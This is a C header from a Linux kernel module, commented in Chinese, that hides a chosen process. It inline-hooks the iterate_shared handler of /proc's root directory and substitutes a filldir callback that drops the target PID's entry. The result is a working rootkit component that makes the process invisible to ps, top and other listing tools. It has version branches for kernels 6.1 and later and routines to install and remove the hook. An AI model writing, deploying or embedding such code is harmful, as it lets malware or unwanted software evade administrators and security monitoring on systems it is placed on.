#ifndef HIDE_PROCESS_H
#define HIDE_PROCESS_H

#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/sched.h>
#include <linux/fs.h>
#include <linux/dcache.h>
#include <linux/proc_fs.h>
#include <linux/version.h>
#include <linux/mutex.h>

#include "export_fun.h"
#include "inline_hook_frame.h"

static pid_t g_hidden_pid = 0;
static filldir_t g_orig_actor = NULL;
static struct hook_entry g_proc_iterate_hook[1];
static DEFINE_MUTEX(g_hide_process_lock);

// filldir 过滤回调
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
static bool hide_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
{
    if (g_hidden_pid && d_type == DT_DIR && namlen > 0 && namlen <= 7)
    {
        char pid_str[8];
        int pid_len = snprintf(pid_str, sizeof(pid_str), "%d", g_hidden_pid);
        if (pid_len == namlen && __builtin_memcmp(name, pid_str, namlen) == 0)
            return true;
    }
    return g_orig_actor ? g_orig_actor(ctx, name, namlen, offset, ino, d_type) : false;
}
#else
static int hide_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
{
    if (g_hidden_pid && d_type == DT_DIR && namlen > 0 && namlen <= 7)
    {
        char pid_str[8];
        int pid_len = snprintf(pid_str, sizeof(pid_str), "%d", g_hidden_pid);
        if (pid_len == namlen && __builtin_memcmp(name, pid_str, namlen) == 0)
            return 0;
    }
    return g_orig_actor ? g_orig_actor(ctx, name, namlen, offset, ino, d_type) : 0;
}
#endif

// nline hook 工作函数
static void proc_iterate_hook_work(struct file *file, struct dir_context *ctx)
{
    if (!g_hidden_pid || !ctx || ctx->actor == hide_filldir)
        return;
    WRITE_ONCE(g_orig_actor, ctx->actor);
    ctx->actor = (filldir_t)hide_filldir;
}

// 安装hook,隐藏目标pid
static int hide_process_install(pid_t pid)
{
    struct file_operations *fops;
    unsigned long iterate_addr;
    int ret = 0;

    mutex_lock(&g_hide_process_lock);

    if (g_proc_iterate_hook[0].installed)
    {
        WRITE_ONCE(g_hidden_pid, pid);
        pr_debug("hide_process: 更新隐藏 PID %d\n", pid);
        goto out_unlock;
    }

    fops = (struct file_operations *)
        generic_kallsyms_lookup_name("proc_root_operations");
    if (!fops || !fops->iterate_shared)
    {
        pr_debug("hide_process: proc_root_operations / iterate_shared 不可用\n");
        ret = -ENOENT;
        goto out_unlock;
    }

    iterate_addr = (unsigned long)fops->iterate_shared;

    g_proc_iterate_hook[0] = (struct hook_entry){
        .target_sym = NULL,
        .target_addr = iterate_addr,
        .work_fn = proc_iterate_hook_work,
        .trampoline = NULL,
        .saved_insn = 0,
        .installed = false,
        .slot_index = -1,
    };

    ret = inline_hook_install(g_proc_iterate_hook);
    if (ret)
    {
        pr_debug("hide_process: inline hook 安装失败 %d\n", ret);
        goto out_unlock;
    }

    WRITE_ONCE(g_hidden_pid, pid);
    pr_debug("hide_process: 隐藏 PID %d (iterate_shared=%px)\n",
             pid, (void *)iterate_addr);

out_unlock:
    mutex_unlock(&g_hide_process_lock);
    return ret;
}

// 卸载hook
static void hide_process_remove(void)
{
    mutex_lock(&g_hide_process_lock);
    inline_hook_remove(g_proc_iterate_hook);
    WRITE_ONCE(g_hidden_pid, 0);
    g_orig_actor = NULL;
    mutex_unlock(&g_hide_process_lock);
    pr_debug("hide_process: hook 已卸载\n");
}

#endif /* HIDE_PROCESS_H */
